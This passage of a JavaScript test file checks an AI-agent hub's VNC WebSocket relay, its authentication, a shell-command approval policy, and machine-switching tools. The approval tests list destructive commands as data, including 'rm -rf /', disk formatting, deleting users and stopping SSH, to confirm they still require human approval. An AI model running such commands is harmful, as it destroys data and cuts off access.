    relay.on('upgrade', (req, socket, head) => bridgeWebSocket(req, socket, head, { port: vnc.address().port }));
    await new Promise((r) => relay.listen(0, '127.0.0.1', r));
    const ws = new WebSocket(`ws://127.0.0.1:${relay.address().port}/x`, ['binary']);
    ws.binaryType = 'arraybuffer';
    const got = [];
    ws.onmessage = (e) => got.push(Buffer.from(e.data));
    await new Promise((resolve, reject) => { ws.onopen = resolve; ws.onerror = () => reject(new Error('ws error')); });
    await sleep(200);
    {
      // noVNC resolves "path" against /novnc/vnc.html, so it must be absolute.
      const { viewerUrl } = await import('../src/desktops.mjs');
      const page = new URL(viewerUrl('chief'), 'http://hub:4390');
      const target = new URL(page.searchParams.get('path'), page);
      check('viewer: the WebSocket path resolves to the hub relay, not under /novnc/', target.pathname === '/api/bots/chief/desktop/ws', target.pathname);
    }
    check('ws bridge: the VNC banner reaches the viewer', Buffer.concat(got).toString() === 'RFB 003.008\n' && ws.protocol === 'binary');
    got.length = 0;
    const big = Buffer.alloc(70_000, 3); // > 64 KB: the 8-byte length form
    ws.send(Buffer.from('hi'));
    ws.send(big);
    await sleep(500);
    const echo = Buffer.concat(got);
    check('ws bridge: masked client frames of any size arrive intact', echo.length === 2 + big.length && echo.subarray(0, 2).toString() === 'hi' && echo.subarray(2).every((b) => b === 3), `${echo.length} bytes`);
    ws.close();
    relay.close();
    vnc.close();
  }

  // Bot desktops are reachable only through the hub's authenticated relay.
  {
    const desktopsSrc = await fsp.readFile(new URL('../src/desktops.mjs', import.meta.url), 'utf8');
    check('websockify binds loopback only', /spawnChild\('websockify', \[`127\.0\.0\.1:\$\{webPort\}`/.test(desktopsSrc));
    check('the bot desktop URL goes through the hub relay', desktopsSrc.includes('desktop/ws') && !/http:\/\/\$\{lanAddress\(\)\}:\$\{entry\.webPort\}/.test(desktopsSrc));
    const unauth = await new Promise((resolve) => {
      const req = http.request(`${base}/api/bots/chief/desktop/ws`, {
        headers: { Connection: 'Upgrade', Upgrade: 'websocket', 'Sec-WebSocket-Version': '13', 'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==' },
      });
      req.on('upgrade', () => resolve('upgraded'));
      req.on('response', (res) => resolve(res.statusCode));
      req.on('error', (err) => resolve(err.message));
      req.end();
    });
    check('the desktop relay never upgrades without a running desktop', unauth === 404 || unauth === 401 || /socket hang up|ECONNRESET/.test(String(unauth)), String(unauth));
  }

  // Remote machines run autonomously; only machine-breaking commands still ask.
  {
    const prev = process.env.DESK_MACHINE_MODE;
    process.env.DESK_MACHINE_MODE = 'remote';
    const remote = approvals.effectivePolicy({ autoApproveAll: false, denyPatterns: ['\\bsudo\\b'] });
    const decide = (command, policy) => approvals.classify('shell', { command }, {
      baseRisk: 'MEDIUM', granted: true, autoApproveMedium: true, autoApproveAll: policy.autonomous, denyPatterns: policy.denyPatterns,
    }).decision;
    check('remote: autonomous by default even if autoApproveAll was false', remote.mode === 'remote' && remote.autonomous === true);
    check('remote: sudo installs run without asking', decide('sudo apt-get install -y ffmpeg', remote) === 'auto');
    check('remote: wiping or cutting off the machine still asks',
      ['rm -rf /', 'sudo mkfs.ext4 /dev/sdb1', 'sudo shutdown -h now', 'sudo systemctl stop ssh', 'passwd ubuntu'].every((c) => decide(c, remote) === 'ask'));
    check('remote: autonomy can be switched off', approvals.effectivePolicy({ remoteAutonomy: false }).autonomous === false);
    check('remote Windows: everyday admin work runs without asking',
      ['winget install --id Git.Git -e', 'Restart-Service Spooler', 'Remove-Item -Recurse -Force C:\\Users\\me\\tmp'].every((c) => decide(c, remote) === 'auto'));
    check('remote Windows: wiping or cutting off the machine still asks',
      ['Format-Volume -DriveLetter D', 'format d: /q', 'Stop-Computer -Force', 'shutdown /s /t 0', 'Remove-Item -Recurse -Force C:\\',
        'Stop-Service sshd', 'Unregister-ScheduledTask -TaskName NightshiftHub', 'net user owner /delete'].every((c) => decide(c, remote) === 'ask'));
    process.env.DESK_MACHINE_MODE = '';
    const local = approvals.effectivePolicy({});
    check('local: sudo still asks', local.mode === 'local' && decide('sudo apt-get install x', local) === 'ask');
    process.env.DESK_MACHINE_MODE = prev || '';
  }

  // The assistant can see the human's machines and hand work to one.
  {
    const seed = JSON.parse(await fsp.readFile(new URL('../config/bots/chief.json', import.meta.url), 'utf8'));
    check('the assistant is granted machine_list and machine_switch', ['machine_list', 'machine_switch'].every((t) => seed.tools.includes(t)));
    const reported = await api('/api/ui/state', { method: 'POST', body: { patch: { machines: [{ name: '本机', url: 'local', current: true }, { name: 'Ubuntu', url: 'http://10.0.0.5:4390' }] } } });
    check('the window can report its machine list', reported.json?.ui?.machines?.length === 2, reported.text);
    const ctx = { app: { uiView: () => ({ machines: reported.json.ui.machines }), applyUi: (patch) => { ctx.sent = patch; } }, bot: { id: 'chief' } };
    const listed = await registry.get('machine_list').run({}, ctx);
    check('machine_list returns the reported machines', listed.machines.length === 2);
    await registry.get('machine_switch').run({ machine: 'ubuntu', task: '打开 bilibili' }, ctx);
    check('machine_switch asks the window to switch and carries the task',
      ctx.sent?.switchMachine?.target === 'http://10.0.0.5:4390' && ctx.sent.switchMachine.message === '打开 bilibili');
    const missing = await errorCode(() => registry.get('machine_switch').run({ machine: 'nowhere' }, ctx));
    check('machine_switch refuses an unknown machine', missing === 'MACHINE_NOT_FOUND', missing);
    const stored = await api('/api/ui/state');
    check('a switch command is never stored as UI state', !('switchMachine' in (stored.json || {})));
  }

}
